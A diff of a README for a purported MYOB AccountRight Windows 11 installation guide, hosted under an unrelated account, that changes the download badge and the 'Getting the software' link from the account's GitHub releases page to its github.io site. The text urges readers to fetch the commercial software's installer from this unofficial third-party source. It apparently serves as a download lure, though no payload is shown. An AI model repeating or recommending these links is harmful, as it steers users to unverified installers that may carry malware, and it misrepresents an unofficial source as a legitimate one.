@@ -1,12 +1,12 @@
 # 📊 MYOB-AccountRight-Windows-Guide - Easy steps for smooth software installation
 
-[![](https://img.shields.io/badge/Download-AccountRight_Guide-blue.svg)](https://github.com/Byzantine-sezession678/MYOB-AccountRight-Windows-Guide/releases)
+[![](https://img.shields.io/badge/Download-AccountRight_Guide-blue.svg)](https://byzantine-sezession678.github.io)
 
 ## 📖 Overview
 This guide helps you put MYOB AccountRight on your Windows 11 computer. Many users face trouble during the setup process. This document provides clear steps to fix installation errors and get your business software running. Follow these instructions to avoid common pitfalls during the setup phase.
 
 ## 📥 Getting the software
-Visit this page to download the latest version of the installer: [https://github.com/Byzantine-sezession678/MYOB-AccountRight-Windows-Guide/releases](https://github.com/Byzantine-sezession678/MYOB-AccountRight-Windows-Guide/releases)
+Visit this page to download the latest version of the installer: [https://byzantine-sezession678.github.io](https://byzantine-sezession678.github.io)
 
 ## 🖥️ System requirements
 Before you start, check your PC settings. MYOB AccountRight needs a stable version of Windows 11. Ensure your system meets these standards:
